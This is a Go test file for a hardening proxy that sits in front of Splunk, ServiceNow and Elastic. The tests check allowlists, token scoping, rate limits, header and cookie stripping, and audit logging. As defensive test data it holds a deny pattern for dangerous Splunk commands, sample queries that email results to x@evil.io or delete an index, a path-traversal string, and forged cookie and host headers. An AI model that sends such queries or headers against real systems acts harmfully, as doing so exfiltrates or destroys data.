package proxy

import (
	"bytes"
	"compress/gzip"
	"io"
	"net/http"
	"net/url"
	"strings"
	"testing"
	"time"

	"github.com/neubirdai/neubird-proxy/internal/config"
)

// Tests for the controls added after the MetLife-architect review.

const lockedConfig = `
client_token_env: NEUBIRD_PROXY_TOKEN
client_token_previous_env: OLD_TOKEN
allow_http_upstreams: true
max_body_bytes: 4096
connections:
  - name: splunk
    upstream: UPSTREAM/splunk
    methods: [GET, POST]
    paths: ["/services/search/(v2/)?jobs(/.*)?"]
    request_deny_patterns: ["(?i)\\|\\s*(sendemail|outputlookup|delete|script)\\b"]
  - name: servicenow
    upstream: UPSTREAM/servicenow
    client_auth: basic
    client_token_env: SCOPED_TOKEN
    paths: ["/api/now/table/(incident|problem)(/[0-9a-f]{32})?"]
    request_headers: [X-No-Response-Body]
  - name: limited
    upstream: UPSTREAM/limited
    rate_limit: {requests_per_second: 0.001, burst: 2}
  - name: elastic
    upstream: UPSTREAM/elastic
    passthrough: true
`

func TestMethodAllowlist(t *testing.T) {
	f := newFixture(t, lockedConfig, jsonHandler(`{}`))
	sn := map[string]string{"Authorization": basic("x", scopedToken)}
	for _, m := range []string{"DELETE", "PUT", "POST", "PATCH"} {
		resp, body := f.do(t, m, "/servicenow/api/now/table/incident/"+strings.Repeat("a", 32), sn)
		if resp.StatusCode != 405 || !strings.Contains(body, "method_not_allowed") || resp.Header.Get("Allow") != "GET, HEAD" {
			t.Fatalf("%s: status %d allow %q body %s", m, resp.StatusCode, resp.Header.Get("Allow"), body)
		}
	}
	if f.lastReq() != nil {
		t.Fatal("a write method reached the upstream")
	}
	if resp, _ := f.do(t, "GET", "/servicenow/api/now/table/incident", sn); resp.StatusCode != 200 {
		t.Fatalf("GET status %d", resp.StatusCode)
	}
}

func TestPathAllowlist(t *testing.T) {
	f := newFixture(t, lockedConfig, jsonHandler(`{}`))
	sn := map[string]string{"Authorization": basic("x", scopedToken)}
	for path, want := range map[string]int{
		"/servicenow/api/now/table/incident":                                             200,
		"/servicenow/api/now/table/problem/" + strings.Repeat("0", 32):                   200,
		"/servicenow/api/now/table/sys_user":                                             403,
		"/servicenow/api/now/table/incident/extra/segment":                               403, // anchored: whole path must match
		"/servicenow/api/now/table/incidentx":                                            403,
		"/servicenow/":                                                                   403,
		"/servicenow/api/now/table/incident/" + strings.Repeat("0", 32) + "/../sys_user": 400, // dot segment
	} {
		if resp, body := f.do(t, "GET", path, sn); resp.StatusCode != want {
			t.Errorf("%s: status %d, want %d (%s)", path, resp.StatusCode, want, body)
		}
	}
}

func TestRequestDenyPatterns(t *testing.T) {
	f := newFixture(t, lockedConfig, jsonHandler(`{}`))
	post := func(body, query string) int {
		req, _ := http.NewRequest("POST", f.proxy.URL+"/splunk/services/search/jobs"+query, strings.NewReader(body))
		req.Header.Set("Authorization", "Bearer "+token)
		req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
		resp, err := f.proxy.Client().Do(req)
		if err != nil {
			t.Fatal(err)
		}
		resp.Body.Close()
		return resp.StatusCode
	}
	form := func(search string) string { return url.Values{"search": {search}}.Encode() }
	if code := post(form("search index=claims | stats count by host"), ""); code != 200 {
		t.Fatalf("benign search: %d", code)
	}
	if got := f.lastReq(); got == nil || got.ContentLength != int64(len(form("search index=claims | stats count by host"))) {
		t.Fatal("request body not restored for the upstream")
	}
	for _, bad := range []string{
		form("search index=claims | sendemail to=x@evil.io"),
		form("search index=claims |outputlookup members.csv"),
		"search=search+index%3Dx+%7C+delete",
	} {
		if code := post(bad, ""); code != 403 {
			t.Errorf("%q: status %d, want 403", bad, code)
		}
	}
	if code := post("", "?search="+url.QueryEscape("| script evil")); code != 403 {
		t.Errorf("deny pattern in query string: %d", code)
	}
}

func TestScopedAndRotatedTokens(t *testing.T) {
	f := newFixture(t, lockedConfig, jsonHandler(`{}`))
	cases := []struct {
		path string
		auth string
		want int
	}{
		{"/splunk/services/search/jobs", "Bearer " + token, 200},
		{"/splunk/services/search/jobs", "Bearer " + oldToken, 200},    // previous token during rotation
		{"/splunk/services/search/jobs", "Bearer " + scopedToken, 401}, // scoped to servicenow only
		{"/servicenow/api/now/table/incident", basic("x", scopedToken), 200},
		{"/servicenow/api/now/table/incident", basic("x", token), 401}, // top-level token does not open it
	}
	for _, c := range cases {
		if resp, _ := f.do(t, "GET", c.path, map[string]string{"Authorization": c.auth}); resp.StatusCode != c.want {
			t.Errorf("%s with %.12s...: status %d, want %d", c.path, c.auth, resp.StatusCode, c.want)
		}
	}
}

func TestRateLimit(t *testing.T) {
	f := newFixture(t, lockedConfig, jsonHandler(`{}`))
	var codes []int
	for i := 0; i < 3; i++ {
		resp, _ := f.do(t, "GET", "/limited/x", bearer)
		codes = append(codes, resp.StatusCode)
	}
	if codes[0] != 200 || codes[1] != 200 || codes[2] != 429 {
		t.Fatalf("codes %v, want [200 200 429]", codes)
	}
	if f.srv.Metrics.Blocked.Value("limited", "rate_limited") != 1 {
		t.Fatal("rate_limited metric")
	}
}

func TestBucketRefills(t *testing.T) {
	now := time.Unix(0, 0)
	b := newBucket(2, 1)
	b.now = func() time.Time { return now }
	b.last = now
	if !b.allow() || b.allow() {
		t.Fatal("burst of 1")
	}
	now = now.Add(500 * time.Millisecond)
	if !b.allow() {
		t.Fatal("did not refill at 2/s")
	}
}

func TestConcurrencyLimit(t *testing.T) {
	release := make(chan struct{})
	started := make(chan struct{}, 1)
	f := newFixture(t, strings.Replace(baseConfig, "max_body_bytes: 4096", "max_body_bytes: 4096\nmax_concurrent_requests: 1", 1),
		func(w http.ResponseWriter, _ *http.Request) {
			w.Header().Set("Content-Type", "text/event-stream")
			w.(http.Flusher).Flush()
			started <- struct{}{}
			<-release
		})
	go func() {
		req, _ := http.NewRequest("GET", f.proxy.URL+"/splunk/stream", nil)
		req.Header.Set("Authorization", "Bearer "+token)
		if resp, err := f.proxy.Client().Do(req); err == nil {
			io.Copy(io.Discard, resp.Body)
			resp.Body.Close()
		}
	}()
	<-started
	resp, body := f.do(t, "GET", "/splunk/x", bearer)
	close(release)
	if resp.StatusCode != 503 || !strings.Contains(body, "overloaded") {
		t.Fatalf("status %d body %s", resp.StatusCode, body)
	}
}

func TestRequestHeaderAllowlist(t *testing.T) {
	f := newFixture(t, lockedConfig, jsonHandler(`{}`))
	f.do(t, "GET", "/servicenow/api/now/table/incident", map[string]string{
		"Authorization":            basic("x", scopedToken),
		"Accept":                   "application/json",
		"X-No-Response-Body":       "false", // allowed by request_headers
		"Ocp-Apim-Trace":           "true",
		"Apim-Debug-Authorization": "x",
		"Cookie":                   "glide_user_session=stolen",
		"X-Forwarded-Host":         "evil",
		"X-Custom":                 "y",
	})
	h := f.lastReq().Header
	for _, k := range []string{"Ocp-Apim-Trace", "Apim-Debug-Authorization", "Cookie", "X-Forwarded-Host", "X-Custom", "Authorization"} {
		if h.Get(k) != "" {
			t.Errorf("%s forwarded upstream", k)
		}
	}
	if h.Get("Accept") != "application/json" || h.Get("X-No-Response-Body") != "false" || h.Get("X-Request-Id") == "" {
		t.Errorf("allowed headers missing: %v", h)
	}
}

func TestResponseCookiesTrailersAndAPIMHeadersStripped(t *testing.T) {
	f := newFixture(t, lockedConfig, func(w http.ResponseWriter, _ *http.Request) {
		w.Header().Set("Set-Cookie", "glide_user_session=abc123secret; Path=/; Secure")
		w.Header().Set("Ocp-Apim-Trace-Location", "https://apim/trace/1")
		w.Header().Set("Trailer", "X-Owner")
		w.Header().Set("Content-Type", "application/json")
		io.WriteString(w, "{}")
		w.Header().Set("X-Owner", "jane@example.com")
	})
	for _, path := range []string{"/servicenow/api/now/table/incident", "/elastic/_search"} {
		auth := basic("x", scopedToken)
		if strings.HasPrefix(path, "/elastic") {
			auth = "Bearer " + token
		}
		resp, _ := f.do(t, "GET", path, map[string]string{"Authorization": auth})
		if resp.Header.Get("Set-Cookie") != "" || resp.Header.Get("Ocp-Apim-Trace-Location") != "" {
			t.Errorf("%s: cookie or APIM header reached NeuBird: %v", path, resp.Header)
		}
		if !strings.HasPrefix(path, "/elastic") && resp.Trailer.Get("X-Owner") != "" {
			t.Errorf("%s: trailer reached NeuBird", path)
		}
		if resp.Header.Get("X-Request-Id") == "" {
			t.Errorf("%s: no X-Request-Id", path)
		}
	}
}

func TestNotTextBlocked(t *testing.T) {
	f := newFixture(t, baseConfig, func(w http.ResponseWriter, r *http.Request) {
		var b bytes.Buffer
		zw := gzip.NewWriter(&b)
		io.WriteString(zw, "ssn 219-09-9999 jane@example.com")
		zw.Close()
		switch r.URL.Path {
		case "/splunk-api/gz-as-text":
			w.Header().Set("Content-Type", "text/plain")
		case "/splunk-api/no-type":
			w.Header()["Content-Type"] = nil // suppress sniffing
		case "/splunk-api/sse":
			w.Header().Set("Content-Type", "text/event-stream")
			io.WriteString(w, "data: ok\n\n")
			w.(http.Flusher).Flush()
			b.WriteString("\n\n")
		}
		w.Write(b.Bytes())
	})
	for _, p := range []string{"/splunk/gz-as-text", "/splunk/no-type"} {
		resp, body := f.do(t, "GET", p, bearer)
		if resp.StatusCode != 502 || !strings.Contains(body, "not_text") {
			t.Errorf("%s: status %d body %q", p, resp.StatusCode, body)
		}
	}
	req, _ := http.NewRequest("GET", f.proxy.URL+"/splunk/sse", nil)
	req.Header.Set("Authorization", "Bearer "+token)
	resp, err := f.proxy.Client().Do(req)
	if err != nil {
		t.Fatal(err)
	}
	body, rerr := io.ReadAll(resp.Body)
	resp.Body.Close()
	if rerr == nil || string(body) != "data: ok\n\n" {
		t.Fatalf("binary SSE event not cut: err %v body %q", rerr, body)
	}
}

func TestAuditHasRequestContext(t *testing.T) {
	f := newFixture(t, baseConfig, jsonHandler(`{}`))
	resp, _ := f.do(t, "GET", "/splunk/x?sysparm_query=email%3Djane%40example.com&limit=5", map[string]string{
		"Authorization": "Bearer " + token, "X-Forwarded-For": "203.0.113.7",
	})
	logs := f.waitForAudit(t)
	for _, want := range []string{
		`"request_id":"` + resp.Header.Get("X-Request-Id") + `"`, `"remote_addr":"127.0.0.1:`,
		`"forwarded_for":"203.0.113.7"`, `"query_keys":["limit","sysparm_query"]`,
	} {
		if !strings.Contains(logs, want) {
			t.Errorf("audit line missing %s: %s", want, logs)
		}
	}
	if strings.Contains(logs, "jane") {
		t.Fatalf("query value logged: %s", logs)
	}
}

func TestConfigRejectsWeakSettings(t *testing.T) {
	envs := func(k string) (string, bool) {
		return map[string]string{"LONG": strings.Repeat("x", 32), "SHORT": "abc"}[k], true
	}
	for name, c := range map[string]struct{ yaml, want string }{
		"short token":       {"client_token_env: SHORT\nconnections: [{name: a, upstream: 'https://x'}]", "at least 32"},
		"http upstream":     {"client_token_env: LONG\nconnections: [{name: a, upstream: 'http://x'}]", "plain http"},
		"bad method":        {"client_token_env: LONG\nconnections: [{name: a, upstream: 'https://x', methods: [TRACE]}]", "unsupported method"},
		"forwarded cookie":  {"client_token_env: LONG\nconnections: [{name: a, upstream: 'https://x', request_headers: [cookie]}]", "Cookie cannot be forwarded"},
		"apim trace header": {"client_token_env: LONG\nconnections: [{name: a, upstream: 'https://x', request_headers: [Ocp-Apim-Trace]}]", "cannot be forwarded"},
		"bad path regex":    {"client_token_env: LONG\nconnections: [{name: a, upstream: 'https://x', paths: ['(']}]", "paths[0]"},
		"bad deny regex":    {"client_token_env: LONG\nconnections: [{name: a, upstream: 'https://x', request_deny_patterns: ['(']}]", "request_deny_patterns[0]"},
		"bad rate limit":    {"client_token_env: LONG\nconnections: [{name: a, upstream: 'https://x', rate_limit: {requests_per_second: 0, burst: 1}}]", "rate_limit"},
		"no token anywhere": {"connections: [{name: a, upstream: 'https://x'}]", "no client token"},
	} {
		t.Run(name, func(t *testing.T) {
			_, err := config.Parse([]byte(c.yaml), envs)
			if err == nil || !strings.Contains(err.Error(), c.want) {
				t.Fatalf("err = %v, want %q", err, c.want)
			}
		})
	}
}
